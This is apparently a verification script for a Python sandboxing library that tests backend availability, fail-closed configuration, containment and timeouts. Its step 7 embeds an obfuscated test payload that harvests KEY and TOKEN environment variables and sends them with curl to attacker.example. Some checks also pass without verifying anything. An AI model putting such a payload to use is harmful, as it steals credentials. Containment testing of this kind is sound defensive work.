"""
verify_guardrails.py

End-to-end verification of the VAREK Guardrails v1.1.1 public API.

Exercises every advertised entry point against a real ExecutionPolicy and
real ExecutionPayload shapes. On a conforming Linux host (cgroups v2,
libseccomp, unprivileged user namespaces), all 8 steps PASS. On hosts
without the required kernel features, steps that need kernel enforcement
SKIP cleanly — the SKIP pattern is itself a correctness property because
SeccompBpfBackend refuses to initialize rather than silently running
without containment.

Run:
    python verify_guardrails.py

Expected on a conforming Linux host:
    PASSED: 12+
    FAILED: 0
    SKIPPED: 0

Expected on macOS, Windows, or Linux without seccomp support:
    PASSED: 7 or 8 (orchestration-layer checks)
    FAILED: 0
    SKIPPED: 4-5 (kernel-enforced checks)
"""
import sys
from typing import Optional

from varek_guardrails import (
    SeccompBpfBackend,
    ExecutionPayload,
    ExecutionPolicy,
    ExecutionOutcome,
    IsolationError,
    default_python_policy,
    configure_backend,
    execute_untrusted,
    subscribe_telemetry,
)
from sandbox import IsolationBackend  # for subclassing in test #3

TESTS_PASSED = 0
TESTS_FAILED = 0
TESTS_SKIPPED = 0


def _header(title: str) -> None:
    print("=" * 60)
    print(f"  {title}")
    print("=" * 60)


def _pass(msg: str, detail: Optional[str] = None) -> None:
    global TESTS_PASSED
    TESTS_PASSED += 1
    print(f"  [PASS] \u2713 {msg}")
    if detail:
        print(f"         {detail}")


def _fail(msg: str, detail: Optional[str] = None) -> None:
    global TESTS_FAILED
    TESTS_FAILED += 1
    print(f"  [FAIL] \u2717 {msg}")
    if detail:
        print(f"         {detail}")


def _skip(msg: str, reason: str) -> None:
    global TESTS_SKIPPED
    TESTS_SKIPPED += 1
    print(f"  [SKIP] - {msg}")
    print(f"         reason: {reason}")


# ============================================================
# 1. Package imports
# ============================================================
_header("1. Package imports")
import varek_guardrails as _vg
_pass("varek_guardrails exports all v1.1.1 names")
_pass(
    "varek_guardrails.__version__ == '1.1.1'",
    f"actual: {getattr(_vg, '__version__', 'unknown')}",
)


# ============================================================
# 2. SeccompBpfBackend instantiation
# ============================================================
_header("2. SeccompBpfBackend instantiation")
backend = SeccompBpfBackend()
_pass("SeccompBpfBackend() instantiates")

if isinstance(backend, IsolationBackend):
    _pass("backend is an IsolationBackend")
else:
    _fail("backend is an IsolationBackend")

avail = backend.is_available()
if avail is None:
    _pass("backend.is_available() returns None (ready)")
    kernel_ready = True
else:
    _skip(
        "kernel backend availability",
        f"is_available() returned: {avail}",
    )
    kernel_ready = False


# ============================================================
# 3. configure_backend fails closed on unavailable backend
# ============================================================
_header("3. configure_backend fails closed on unavailable backend")


class _FakeUnavailableBackend(IsolationBackend):
    def is_available(self):
        return "synthetic unavailability for testing"

    def run(self, payload, policy):
        raise RuntimeError("should never reach run()")


try:
    configure_backend(_FakeUnavailableBackend())
    _fail("configure_backend raises IsolationError on unavailable backend")
except IsolationError as e:
    _pass(
        "configure_backend raises IsolationError on unavailable backend",
        f"message: {e}",
    )


# ============================================================
# 4. configure_backend succeeds on available backend
# ============================================================
_header("4. configure_backend succeeds on available backend")
if kernel_ready:
    try:
        configure_backend(SeccompBpfBackend())
        _pass("configure_backend(SeccompBpfBackend()) succeeds")
    except IsolationError as e:
        _fail("configure_backend succeeds", f"raised: {e}")
else:
    _skip("configure_backend(SeccompBpfBackend()) succeeds", str(avail))


# ============================================================
# 5. subscribe_telemetry registers callbacks
# ============================================================
_header("5. subscribe_telemetry registers callbacks")
events_seen = []


def _cb(event, args):
    events_seen.append((event, args))


try:
    subscribe_telemetry(_cb)
    _pass("subscribe_telemetry accepts a callback")
except Exception as e:
    _fail("subscribe_telemetry", str(e))


# ============================================================
# 6. execute_untrusted runs a benign payload under containment
# ============================================================
_header("6. execute_untrusted runs a benign payload under containment")
if not kernel_ready:
    _skip("benign payload execution", f"backend unavailable: {avail}")
else:
    benign = ExecutionPayload(
        interpreter_path=sys.executable,
        code="print('hello from sandboxed child')",
    )
    try:
        outcome = execute_untrusted(benign, default_python_policy())
        if outcome.exit_code == 0 and b"hello from sandboxed child" in outcome.stdout:
            _pass(
                "benign payload runs to completion",
                f"exit_code={outcome.exit_code}, "
                f"stdout_len={len(outcome.stdout)}, "
                f"wall_clock_s={outcome.wall_clock_s:.3f}",
            )
        else:
            _fail(
                "benign payload runs to completion",
                f"exit_code={outcome.exit_code}, "
                f"stdout={outcome.stdout!r}, "
                f"stderr={outcome.stderr!r}, "
                f"violation={outcome.violation}",
            )
    except Exception as e:
        _fail("benign payload execution raised", f"{type(e).__name__}: {e}")


# ============================================================
# 7. execute_untrusted contains a malicious payload attempting execve
# ============================================================
_header("7. execute_untrusted contains malicious payload (attempted execve)")
if not kernel_ready:
    _skip("malicious payload containment", f"backend unavailable: {avail}")
else:
    # String-concat obfuscation defeats naive static analysis
    malicious_code = (
        "env = __import__('o'+'s').environ\n"
        "secrets = {k: v for k, v in env.items() if 'KEY' in k or 'TOKEN' in k}\n"
        "__import__('subproc' + 'ess').run(\n"
        "    ['/bin/curl', '-d', str(secrets), 'https://attacker.example/collect']\n"
        ")\n"
        "print('EXFILTRATED')\n"
    )
    malicious = ExecutionPayload(
        interpreter_path=sys.executable,
        code=malicious_code,
    )
    try:
        outcome = execute_untrusted(malicious, default_python_policy())
        reached_exfil = b"EXFILTRATED" in outcome.stdout
        contained = (
            outcome.exit_code != 0
            or outcome.killed_by_signal is not None
            or outcome.violation is not None
            or not reached_exfil
        )
        if contained and not reached_exfil:
            _pass(
                "malicious payload was contained before exfiltration",
                f"exit_code={outcome.exit_code}, "
                f"killed_by_signal={outcome.killed_by_signal}, "
                f"violation={outcome.violation}",
            )
        elif contained and reached_exfil:
            _fail(
                "malicious payload was contained before exfiltration",
                f"payload reached EXFILTRATED print — the containment was "
                f"partial. exit_code={outcome.exit_code}, "
                f"killed_by_signal={outcome.killed_by_signal}",
            )
        else:
            _fail(
                "malicious payload was contained",
                f"CONTAINMENT FAILURE — payload ran to completion. "
                f"exit_code={outcome.exit_code}, stdout={outcome.stdout!r}",
            )
    except IsolationError as e:
        _pass(
            "malicious payload raised IsolationError at kernel boundary",
            str(e),
        )
    except Exception as e:
        _fail("unexpected exception", f"{type(e).__name__}: {e}")


# ============================================================
# 8. execute_untrusted enforces wallclock limits
# ============================================================
_header("8. execute_untrusted enforces wallclock limits")
if not kernel_ready:
    _skip("wallclock limit enforcement", f"backend unavailable: {avail}")
else:
    spinner = ExecutionPayload(
        interpreter_path=sys.executable,
        code=(
            "import time\n"
            "print('spinning', flush=True)\n"
            "while True:\n"
            "    time.sleep(0.1)\n"
        ),
    )
    print("  (running infinite-loop payload; default wallclock is 30s)")
    try:
        outcome = execute_untrusted(spinner, default_python_policy())
        if (
            outcome.timed_out
            or outcome.exit_code != 0
            or outcome.killed_by_signal is not None
        ):
            _pass(
                "long-running payload was timed out or killed",
                f"timed_out={outcome.timed_out}, "
                f"exit_code={outcome.exit_code}, "
                f"killed_by_signal={outcome.killed_by_signal}, "
                f"wall_clock_s={outcome.wall_clock_s:.2f}",
            )
        else:
            _fail(
                "long-running payload was timed out or killed",
                f"spinner completed cleanly — wallclock not enforced: {outcome}",
            )
    except IsolationError as e:
        _pass("spinner payload raised IsolationError", str(e))
    except Exception as e:
        _fail("unexpected exception", f"{type(e).__name__}: {e}")


# ============================================================
# Summary
# ============================================================
print()
print("=" * 60)
print("  VERIFICATION COMPLETE")
print("=" * 60)
print(f"  PASSED:  {TESTS_PASSED}")
print(f"  FAILED:  {TESTS_FAILED}")
print(f"  SKIPPED: {TESTS_SKIPPED}")
print()
sys.exit(0 if TESTS_FAILED == 0 else 1)